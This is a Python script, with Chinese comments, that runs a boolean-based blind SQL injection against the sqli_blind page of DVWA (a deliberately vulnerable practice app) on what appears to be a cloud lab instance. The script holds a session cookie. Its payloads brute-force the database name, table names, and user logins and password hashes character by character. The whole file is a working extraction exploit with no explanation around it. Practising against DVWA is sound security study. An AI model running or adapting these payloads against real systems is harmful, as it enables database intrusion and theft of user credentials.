import requests

# ======================配置，PHPSESSID务必干净无空格换行======================
URL = "https://f0012fbf98204f57ae3bbf2cb76c8bce--8080.ap-shanghai2.cloudstudio.club/vulnerabilities/sqli_blind/"
COOKIE = {
    "PHPSESSID": "ldi9n0nspgemlhdv38su5o9dt3",
    "security": "low"
}
# ==========================================================================

def get_true(payload: str) -> bool:
    params = {
        "id": payload,
        "Submit": "Submit"
    }
    resp = requests.get(URL, params=params, cookies=COOKIE, timeout=20)
    return "User ID exists in the database" in resp.text


def get_db_name():
    db_name = ""
    for pos in range(1, 20):
        found = False
        for asc in range(32, 127):
            payload = f"1' and ascii(substr(database(),{pos},1))={asc} -- "
            if get_true(payload):
                db_name += chr(asc)
                found = True
                print(f"[库名]第{pos}位: {chr(asc)}")
                break
        if not found:
            break
    return db_name


def get_table_name(db_name: str, limit_idx: int):
    table = ""
    for pos in range(1, 30):
        found = False
        for asc in range(32, 127):
            payload = (f"1' and ascii(substr((select table_name from information_schema.tables "
                       f"where table_schema='{db_name}' limit {limit_idx},1),{pos},1))={asc} -- ")
            if get_true(payload):
                table += chr(asc)
                found = True
                print(f"[表{limit_idx}]第{pos}位: {chr(asc)}")
                break
        if not found:
            break
    return table


def get_data(table: str, col: str, row_idx: int):
    res = ""
    for pos in range(1, 64):
        found = False
        for asc in range(32, 127):
            payload = (f"1' and ascii(substr((select `{col}` from {table} limit {row_idx},1),{pos},1))={asc} -- ")
            if get_true(payload):
                res += chr(asc)
                found = True
                print(f"[行{row_idx}][{col}]第{pos}位: {chr(asc)}")
                break
        if not found:
            break
    return res


if __name__ == "__main__":
    print("==== 开始布尔盲注 DVWA sqli_blind ====")
    db = get_db_name()
    print(f"\n数据库名: {db}\n")

    for i in range(0, 10):
        t = get_table_name(db, i)
        print(f"表{i}: {t}")
        if t == "users":
            print("\n✅找到users表，开始爆破账号密码\n")
            for row in range(0, 5):
                username = get_data("users", "user", row)
                passwd_hash = get_data("users", "password", row)
                if not username:
                    break
                print(f"\n>>> 用户{row}: username={username} | password_hash={passwd_hash}")
        if not t:
            break
